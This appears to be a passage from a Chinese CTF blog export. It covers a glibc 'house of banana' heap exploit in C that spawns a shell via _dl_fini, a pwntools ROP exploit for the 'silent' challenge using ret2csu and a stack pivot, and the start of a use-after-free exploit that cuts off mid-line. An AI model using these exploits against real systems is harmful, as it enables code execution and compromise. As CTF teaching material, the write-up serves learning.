<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似一个 uaf 修改</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改 _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next 的地址为 p2</span></span><br><span class="line">  <span class="comment">// 最后一个linkmap链表遍历 p2</span></span><br><span class="line">  <span class="comment">// 建议 p *(struct link_map *) p2_addr 看一下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题：assert i &lt; nloaded 错误，因此要将 (struct linkmap *p2) -&gt;l_next 置为0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called 为0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; 像是一个magic number</span></span><br><span class="line">  <span class="comment">// 必须为其余类型的值，因此打印出来替换</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后的程序崩溃了😥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  ► 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 但是发现在gdb 调试情况下可以执行一次命令就会崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE 入门</a></li>
<li><a href="https://bbs.kanxue.com/thread-273895.htm">House of cat新型glibc中IO利用手法解析|安全招聘|kanxue.com</a></li>
<li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法</a></li>
<li><a href="https://www.anquanke.com/post/id/222948">house of banana-安全客</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏程杯</title>
    <url>/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/</url>
    <content><![CDATA[<blockquote>
<p>CTF PWN</p>
</blockquote>
<span id="more"></span>

<p>调试时去除alarm函数：使用16进制编辑器，将所有的alarm改成 <code>isnan</code></p>
<p>或者使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g &lt;二进制文件&gt;</span><br></pre></td></tr></table></figure>
<h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>开启PIE和NX保护，漏洞点是一个栈溢出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init_seccomp</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>没有puts，write等可以进行泄露的函数。思路为将某些函数的got表读入bss段，使用ret2csu。</p>
<ul>
<li>读got表需要gadget至少存在可以修改地址内容片段，形如 <code>mov [xxx], xxx</code> 。用于取值，而且需要我们可以控制寄存器的内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary silent</span><br><span class="line">0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure>


<ol>
<li>栈溢出，使用ret2csu，向bss段读入ROP chain。</li>
<li>栈迁移，转到bss段的ROPchain执行</li>
</ol>
<ul>
<li>使用magic 修改read_got 表内容为syscall</li>
<li>泄露出libc_base</li>
<li>继续read ROPchian，栈迁移执行ROPchain</li>
</ul>
<p>需要注意</p>
<ul>
<li>取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为<strong>负，加0x100000000取补码</strong>。</li>
<li>控制rax，使用函数返回值是rax来控制</li>
<li>栈迁移的重点是控制rsp，也可以使用 pop_rsp 直接控制。</li>
</ul>
<p>最终的exp</p>
<ul>
<li>调试二三十次才明白，<del>但是很快就会忘</del>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;silent_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400788</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400961</span></span><br><span class="line">ret = <span class="number">0x0000000000400696</span></span><br><span class="line">leave_ret = <span class="number">0x0000000004008FC</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040095d</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt.read</span><br><span class="line">read_got = elf.got.read</span><br><span class="line"></span><br><span class="line">csu_front = <span class="number">0x400940</span></span><br><span class="line">csu_end = <span class="number">0x40095A</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x0400878</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu:    0, 1, call, rdi, rsi, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:0000000000400940 4C 89 FA                      mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400943 4C 89 F6                      mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400946 44 89 EF                      mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400949</span></span><br><span class="line"><span class="string">.text:000000000040094D 48 83 C3 01                   add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400954 75 EA                         jnz     short loc_400940</span></span><br><span class="line"><span class="string">.text:0000000000400954</span></span><br><span class="line"><span class="string">.text:0000000000400956</span></span><br><span class="line"><span class="string">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400956 48 83 C4 08                   add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040095A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040095B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040095C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040095E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400960 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400962 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400964 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">64</span> + <span class="number">8</span>)</span><br><span class="line">p1 += flat([</span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0x400</span>,</span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">])</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss ROP chain</span></span><br><span class="line"><span class="comment"># 调用bss段的代码，然后最后 pop rbp 给rbp指定一个值，就是 stdout+0x3d</span></span><br><span class="line"><span class="comment"># 调用magic gadget ，[stdout] 内容</span></span><br><span class="line"><span class="comment"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2xg &amp;stdout</span></span><br><span class="line"><span class="string">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; p syscall</span></span><br><span class="line"><span class="string">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d1b520 &lt;syscall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10wi 0x7fc4d7d1b520</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d100f0 &lt;write&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = flat([</span><br><span class="line">    stdout+<span class="number">0x3d</span>,                        <span class="comment"># rbp</span></span><br><span class="line">    csu_end, <span class="number">0x100000000</span>+<span class="number">0x7fc4d7d1b537</span>-<span class="number">0x00007fc4d7fec760</span>, stdout+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    magic,                                                      <span class="comment"># 将stdout 改成syscall</span></span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x1</span>,                <span class="comment"># 函数返回值为rax</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, stdout, <span class="number">1</span>, read_got, <span class="number">8</span>,                 <span class="comment"># syscall (1, 1, read_got, 8)。</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x100</span>,         <span class="comment"># 读入第二个ROPchian</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret                                                   <span class="comment"># 迁移到第二个bss_chain</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">s(p2)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - libc.sym.read</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;bss&quot;</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = bss+<span class="number">0x1000</span></span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx; ret&quot;</span>)).__next__() </span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi; ret&quot;</span>)).__next__() </span><br><span class="line"></span><br><span class="line">rop_chian = flat([</span><br><span class="line">    <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>,  <span class="comment"># 填充8字节</span></span><br><span class="line">    pop_rdi_ret, flag_addr, pop_rsi_ret, <span class="number">0</span>, open_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, write_addr,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">s(rop_chian)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><p>coffee_list: 存储咖啡信息。<br>两个coffee_left数组，分别是 user 和 admin，是一个 <code>3*7</code> 数组，id和position</p>
<p>user</p>
<ul>
<li>购买，输入id，按照pos顺序进行free</li>
<li>查看，打印出 coffee_list 信息</li>
</ul>
<p>admin</p>
<ul>
<li>replenish：先更新admin coffee_list，然后更新 user coffee_left</li>
<li>change_default，输入id和pos更新内容，然后更新user coffee_left</li>
</ul>
<p>存在两个问题，都可以进行泄露和 get shell</p>
<ul>
<li>admin在 change_default 使，没有先进行update，直接read会导致uaf问题</li>
<li>数组underflow，因为读入的id, pos 没有判断是否小于0。</li>
</ul>
<p>exp如下</p>
<ul>
<li>由于change_default存在更新，容易导致double free 和 无法  replenish 的错误，我们需要中途更新一下admin coffee_left。（<del>菜鸡的眼泪</del></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;pwn_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">idx, con = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input the id of what coffee you want to buy&quot;</span>, itob(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Do you want to add something?Y/N&quot;</span>, <span class="string">b&quot;Y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Ok,please input what you need in coffee&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    menu(<span class="number">0x1145</span>)</span><br><span class="line">    sa(<span class="string">b&quot;please input the admin password&quot;</span>, <span class="string">b&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_admin</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to replenish&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_default</span>(<span class="params"><span class="built_in">id</span>, pos, con</span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to change&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    sa(<span class="string">b&quot;input which coffee you want to change&quot;</span>, itob(pos))</span><br><span class="line">    sa(<span class="string">b&quot;input your content&quot;</span>, con)</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line">free_got = elf.got.free</span><br><span class="line">cofflist = <span 